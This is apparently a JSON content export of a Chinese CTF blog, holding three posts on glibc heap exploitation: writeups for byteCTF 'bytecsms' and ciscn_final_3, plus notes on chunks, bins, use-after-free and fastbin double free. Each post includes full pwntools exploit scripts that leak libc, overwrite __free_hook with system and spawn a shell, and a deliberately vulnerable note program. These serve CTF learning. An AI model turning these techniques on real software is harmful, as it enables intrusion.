{"meta":{"title":"Scardow's blog","subtitle":"","description":"","author":"Scarce Shadow","url":"https://scardow.github.io","root":"/"},"pages":[{"title":"categories","date":"2021-09-12T01:28:56.246Z","updated":"2021-09-12T01:28:56.246Z","comments":true,"path":"categories/index.html","permalink":"https://scardow.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-09-12T01:28:31.543Z","updated":"2021-09-12T01:28:31.543Z","comments":true,"path":"tags/index.html","permalink":"https://scardow.github.io/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2020-09-12T16:00:00.000Z","updated":"2021-09-22T13:04:34.859Z","comments":true,"path":"about/index.html","permalink":"https://scardow.github.io/about/index.html","excerpt":"","text":"Introdution一个期望每天都能进步的learning pwner 👶 自我介绍就多来点废话吧 Email: &#x73;&#x63;&#x61;&#114;&#x63;&#x65;&#115;&#x68;&#97;&#100;&#111;&#119;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#x6f;&#x6d; 学校: XDU 2020-09-13 爱好：乒乓球，毛笔，金庸小说，《名侦探柯南》"}],"posts":[{"title":"C++PWN中vector容器数据结构的利用","slug":"C-pwn","date":"2021-10-31T15:26:28.000Z","updated":"2021-11-01T00:49:45.075Z","comments":true,"path":"2021/10/31/C-pwn/","link":"","permalink":"https://scardow.github.io/2021/10/31/C-pwn/","excerpt":"我C，嘉嘉！！！然然带我走吧，别让我做C++","text":"我C，嘉嘉！！！然然带我走吧，别让我做C++ C++PWN中vector的利用byteCTF-bytecsms，过了好几周才想起来复现，我是懒狗。参考了eqqie师傅的思路，并且学习了C++的技巧 漏洞在于vector计数漏洞，remove时会删去所有相同名字的元素，而bss_num仅仅减少1，而索引时通过bss_num索引，这就导致了越界访问 通过大量添加元素使得vector大小达到128k，（实际调试时大于128k，这时通过edit一个可读可写的地址泄露libc，这里应该原样填回，否则会crash。同样道理，修改free_hook。我发现一个有意思的地方，可以省去一小步，虽然并没有什么显著效果，就是在输入score时输入一个字母可以直接被忽略而避免修改重要内容 最后，upload剩余的元素，使存放upload的vector重新分配，此时会调用free 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596from pwn import*context.log_level = &quot;debug&quot;p = process(&quot;./pwn&quot;)p.sendafter(b&quot;Password for admin:\\n&quot;, b&quot;\\x00&quot;)while True: if p.recv(9) == b&quot;Incorrect&quot;: p.sendafter(b&quot;Password for admin:\\n&quot;, b&quot;\\x00&quot;) else: breakdef cmd(choise: int): p.recvuntil(b&quot;&gt; &quot;) p.sendline(str(choise).encode())def add(name, scores: int): cmd(1) p.recvuntil(b&quot;name:&quot;) p.sendline(name) p.recvuntil(b&quot;scores&quot;) p.sendline(str(scores).encode()) p.recvuntil(b&quot;return&quot;) p.sendline(b&quot;4869&quot;)def remove(way: str, name_or_index): cmd(2) p.recvuntil(b&quot;index&quot;) if &quot;name&quot; == way: p.sendline(b&quot;1&quot;) p.recvuntil(&quot;deleted&quot;) p.sendline(name_or_index) elif &quot;index&quot; == way: p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;Index?&quot;) p.sendline(str(name_or_index).encode())def edit(way: str, name_or_index, new_name, new_score: int): cmd(3) if &quot;name&quot; == way: p.recvuntil(b&quot;index&quot;) p.sendline(b&quot;1&quot;) p.recvuntil(b&quot;edit&quot;) p.sendline(name_or_index) elif &quot;index&quot; == way: p.recvuntil(b&quot;index&quot;) p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;Index?&quot;) p.sendline(str(name_or_index).encode()) p.recvuntil(b&quot;name:&quot;) p.sendline(new_name) p.recvuntil(b&quot;score:&quot;) p.sendline(str(new_score).encode())def upload(): cmd(4)def download(): cmd(5)def exit(): cmd(6)# p *$rebase(0x207280)# leak 237568# free 238513add(b&quot;/bin/sh&quot;, 0x1)for i in range(0x2100-1): add(b&quot;/bin/sh\\x00&quot;, 0x1)upload()for i in range(100): remove(&quot;name&quot;, b&quot;/bin/sh\\x00&quot;) download()offset_mmap_libc = 0x1d7000offser_free = 0x1eeb28cmd(3)p.recvuntil(b&quot;2.Edit by index\\n&quot;)p.sendline(b&quot;2&quot;)p.recvuntil(b&quot;Index?\\n&quot;)p.sendline(b&quot;237568&quot;)p.recvuntil(b&quot;237568\\x09&quot;)libc_leak = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))p.sendline(p64(libc_leak))p.recvuntil(b&quot;score:\\n&quot;)p.sendline(&quot;a&quot;)libc = libc_leak - 4160432-151552system = libc + 0x55410success(&quot;libc_leak &quot;+hex(libc))edit(&quot;index&quot;, 238513, b&quot;a&quot;*8+p32(system&amp;0xffffffff), system&gt;&gt;32)remove(&quot;name&quot;, b&quot;/bin/sh\\x00&quot;)p.interactive() 踩坑记录 在io时卡住，这是在应该克服 修改free_hook时，由于偏移，只能通过修改一半name，一半score，在输入score时，误输入了p32，而应该直接输入整数","categories":[{"name":"writeup","slug":"writeup","permalink":"https://scardow.github.io/categories/writeup/"}],"tags":[{"name":"C++PWN","slug":"C-PWN","permalink":"https://scardow.github.io/tags/C-PWN/"},{"name":"heap","slug":"heap","permalink":"https://scardow.github.io/tags/heap/"}]},{"title":"tcache_pthread","slug":"tcache","date":"2021-10-30T05:35:21.000Z","updated":"2021-10-30T05:45:43.134Z","comments":true,"path":"2021/10/30/tcache/","link":"","permalink":"https://scardow.github.io/2021/10/30/tcache/","excerpt":"通过一个国赛的题目学习tcache利用","text":"通过一个国赛的题目学习tcache利用 Tcache_pthread利用ciscn_final_3C++程序，逻辑很简单，只能分配(次数：0x18)和释放(UAF)，没有修改与输出，只有分配时提供堆块地址，原题提供libc-2.27，tcache无double free检查，题使用加入检查的2.27版本 将tcache填满，加入两个fastbin进行double free，获得0x250的tcachebin，并修改0x250的bins数量，使之进入unsorted bin 伪造tcache next使得 tcache下一次可以拿到libc上的一个地址 劫持free_hook，tcache没有有关检查，可以轻松拿到free_hook 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import*context.log_level = &quot;debug&quot;p = process(&quot;./ciscn_final_3_hard&quot;)def cmd(choise:int): p.recvuntil(&quot;&gt; &quot;) p.sendline(str(choise))def add(idx:int, size:int, context): cmd(1) p.recvuntil(&quot;index&quot;) p.sendline(str(idx)) p.recvuntil(&quot;size&quot;) p.sendline(str(size)) p.recvuntil(&quot;something&quot;) p.send(context) p.recvuntil(&quot;gift :&quot;) return int(p.recvline()[:-1], 16)def remove(idx:int): cmd(2) p.recvuntil(&quot;index&quot;) p.sendline(str(idx))heap = add(0, 0x70, b&quot;a&quot;*0x10) - 0x11e70# fill tcache 0x70for i in range(1, 9): add(i, 0x70, b&quot;a&quot;*0x10)for i in range(9): remove(i)# double free chunk7remove(7)# empty tcachefor i in range(9, 16): add(i, 0x70, b&quot;b&quot;*0x10)# fastbin move 2 tcache!!!fake = heap + 0x10add(16, 0x70, p64(fake))add(17, 0x70, b&quot;b&quot;*0x10)add(18, 0x70, b&quot;b&quot;*0x10)# fake tcachebin # 0x250 : 0x7 add(19, 0x70, b&quot;\\x00&quot;*(0x25-0x2)+b&quot;\\x07&quot;)# move2unsortedbinremove(19)# unsorted bin fd &lt;=&gt; fake tcache 0x20add(20, 0x50, b&quot;\\x07&quot;*0x40+p64(fake+0x60))leak = add(21, 0x50, p64(fake))libc = leak - 0x3ebca0one_gadget = libc + 0xe569fsystem = libc + 0x4f550malloc_hook = libc + 0x3ebc30free_hook = libc + 0x3ed8e8add(22, 0x10, p64(free_hook))add(23, 0x50, p64(system))gdb.attach(p)add(24, 0x10, b&quot;/bin/sh\\x00&quot;)remove(24)p.interactive() 踩坑记录 由于tcache stash 机制，fast bin中bins会全部进入tcache，而tcache指针指向位置比fastbin 多了0x10 tcache count一定得控制好，否则会莫名奇妙的crash","categories":[{"name":"learning","slug":"learning","permalink":"https://scardow.github.io/categories/learning/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"},{"name":"Heap exploition","slug":"Heap-exploition","permalink":"https://scardow.github.io/tags/Heap-exploition/"},{"name":"Tcache","slug":"Tcache","permalink":"https://scardow.github.io/tags/Tcache/"}]},{"title":"Heap Exploitation","slug":"Heap Exploitation","date":"2021-08-16T23:54:01.000Z","updated":"2021-10-30T05:40:59.397Z","comments":true,"path":"2021/08/17/Heap Exploitation/","link":"","permalink":"https://scardow.github.io/2021/08/17/Heap%20Exploitation/","excerpt":"本文主要记录堆利用手法，并会随学习过程不断补充","text":"本文主要记录堆利用手法，并会随学习过程不断补充 Heap intro briefHeap memory allocator ptmalloc2 - glibc … (先记录glibc，复杂的堆管理器之后学) Mechanism of glibc malloc堆中数据结构 malloc分配最小空间（SIZE_T*4） chunk 结构 chunk头 + data Chunk 分类allocated chunk prev_size 若连续记忆体上一堆块为free chunk，prev_size为前一个堆块大小 若连续记忆体上一块为allocated chunk，则为上一块的data size由于size大小存在对齐，所以size后三比特始终为零，因此可以保存三个flag PREV_INUSE (bit 0): 上一块是否allocated IS_MMAPPED(bit 1): 该chunk是否由mmap分配 NON_MAIN_ARENA(bit 2): 是否不属于main arena free chunk ( bin ) prev_size size 同allocated chunk fd：指向链表的下一个chunk( 含bin头 ) bk: 指向链表的前一个chunk( 含bin头 ) fd_nextsize: 指向下一个large chunk( 不含bin头 ) bk_nextsize: 指向前一个large chunk( 不含bin头 ) top chunk 第一次malloc分配的heap为main arena，未分配的大堆块为top chunk last remainder malloc分配时unsorted bin切块后存入，unsorted bin仍存在 binchunk free后进入bin fast bin 单向链表, 相同大小在一条链上 LIFO 不会把下一块chunk P设置成0 size分为0x20，0x30，0x40 … 0x80 global_max_fast = 0x80 small bin 双向链环, 相同大小在一条链上 FIFO 会把下一块chunk P设置成0 size: 0x20, 0x30, 0x40 … 0x90 … 0x3f0 按照size大小分为62个bin, 分别为2~63 下标 SIZE_SZ=8（64 位） 2 0x20 3 0x30 4 0x40 5 0x50 X 0xX0 63(3F) 0x3f0 其中0x20 … 0x90为unsorted bin切割后分配的 large bin 双向链环(sorted) size &gt;= 1024(0x400) 组 数量 公差 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 不限制 unsorted bin 双向链环 free chunk大小大于0x80, glibc将chunk先放入unsorted bin malloc的执行过程 第一次malloc：当申请内存空间 &lt;128 KB 时， kernel分配132KB 的top chunk；&gt;128KB 时，使用mmap分配内存 第二次及之后： fastbin(LIFO) bins 按照索引从小到大查找 top chunk 向kernel索要空间 free 的执行过程与chunk的合并 free chunk先看上一块是否为free chunk(P位是否为0)，若是，则于前一堆块合并，在对前一个堆块unlink 再看下一堆块： top chunk: 与之合并（第二步使用的是合并之后的堆块） free：合并后一同加入unsorted bin inuse：加入unsorted bin 堆利用手法 UAFfree(pointer) 后未将指针ptr清空, 该ptr称作dangling pointer，即为一个pointer指向一块释放的记忆体. 利用 infomation leak free 两个fastbin size的chunk，第二个chunk fd指向第一个chunk，若存在UAF，可将chunk user date输出leak addr malloc一块非fastbin，free是进入unsorted bin，fd 指向libc，ke输出或malloc回该堆块 struct type confusion double free 案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;struct note &#123; void (*printnote)(); char *content ;&#125;;struct note *notelist[5];int count = 0; void print_note_content(struct note *this)&#123; puts(this-&gt;content);&#125;void add_note()&#123; int i ; char buf[8]; int size ; if(count &gt; 5)&#123; puts(&quot;Full&quot;); return ; &#125; for(i = 0 ; i &lt; 5 ; i ++)&#123; if(!notelist[i])&#123; notelist[i] = (struct note*)malloc(sizeof(struct note)); if(!notelist[i])&#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; notelist[i]-&gt;printnote = print_note_content; printf(&quot;Note size :&quot;); read(0,buf,8); size = atoi(buf); notelist[i]-&gt;content = (char *)malloc(size); if(!notelist[i]-&gt;content)&#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; printf(&quot;Content :&quot;); read(0,notelist[i]-&gt;content,size); puts(&quot;Success !&quot;); count++; break; &#125; &#125;&#125;void del_note()&#123; char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(notelist[idx])&#123; free(notelist[idx]-&gt;content); free(notelist[idx]); puts(&quot;Success&quot;); &#125;&#125;void print_note()&#123; char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(notelist[idx])&#123; notelist[idx]-&gt;printnote(notelist[idx]); &#125;&#125;void magic()&#123; system(&quot;id&quot;);&#125;void menu()&#123; puts(&quot;----------------------&quot;); puts(&quot; HackNote &quot;); puts(&quot;----------------------&quot;); puts(&quot; 1. Add note &quot;); puts(&quot; 2. Delete note &quot;); puts(&quot; 3. Print note &quot;); puts(&quot; 4. Exit &quot;); puts(&quot;----------------------&quot;); printf(&quot;Your choice :&quot;);&#125;;int main()&#123; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); char buf[4]; while(1)&#123; menu(); read(0,buf,4); switch(atoi(buf))&#123; case 1 : add_note(); break ; case 2 : del_note(); break ; case 3 : print_note(); break ; case 4 : exit(0); break ; default : puts(&quot;Invalid choice&quot;); break ; &#125; &#125; return 0;&#125; 漏洞点 free后未将指针清空造成UAF 利用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *host = &quot;training.pwnable.tw&quot;port = 11010# r = remote(host,port)r = process(&quot;./hacknote&quot;)gdb.attach(r)def addnote(size,content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))magic = 0x08048986# system@plt + 6system = 0x8048506addnote(32,&quot;ddaa&quot;)addnote(32,&quot;ddaa&quot;)addnote(32,&quot;ddaa&quot;)delnote(0)delnote(1)# note = system# context = &quot;;sh;&quot;addnote(8,p32(system) + b&quot;;sh;&quot;)printnote(0)r.interactive() Heap overflow利用using unlink透过overflow覆盖free chunk的fd、bk，再利用unlink unlink原理 根据上图，知shellcode被截断，因此可以使用jmp指令跳过 带有保护机制的unlinkFastbin attack利用Double free 只会检查fastbin link list是否等于将要free的chunk free(a); free(b); free(a) 此时，在malloc一个与 a 相同大小的chunk，则会取出 a，这时a 既为free，又为allocated，若在a中输入数据，就会更改a的fd指针，从而构造fake chunk，malloc出fake之后，造成任意地址任意写，或写入栈中控制程序流 malloc时会检测chunk size 在fake chunk地址 + 0x8 伪造size 在附近寻找目标size 利用技巧 参考资料： CTFwiki Angleboy的PPT","categories":[{"name":"note","slug":"note","permalink":"https://scardow.github.io/categories/note/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"},{"name":"Heap exploition","slug":"Heap-exploition","permalink":"https://scardow.github.io/tags/Heap-exploition/"},{"name":"glibc","slug":"glibc","permalink":"https://scardow.github.io/tags/glibc/"}]}],"categories":[{"name":"writeup","slug":"writeup","permalink":"https://scardow.github.io/categories/writeup/"},{"name":"learning","slug":"learning","permalink":"https://scardow.github.io/categories/learning/"},{"name":"note","slug":"note","permalink":"https://scardow.github.io/categories/note/"}],"tags":[{"name":"C++PWN","slug":"C-PWN","permalink":"https://scardow.github.io/tags/C-PWN/"},{"name":"heap","slug":"heap","permalink":"https://scardow.github.io/tags/heap/"},{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"},{"name":"Heap exploition","slug":"Heap-exploition","permalink":"https://scardow.github.io/tags/Heap-exploition/"},{"name":"Tcache","slug":"Tcache","permalink":"https://scardow.github.io/tags/Tcache/"},{"name":"glibc","slug":"glibc","permalink":"https://scardow.github.io/tags/glibc/"}]}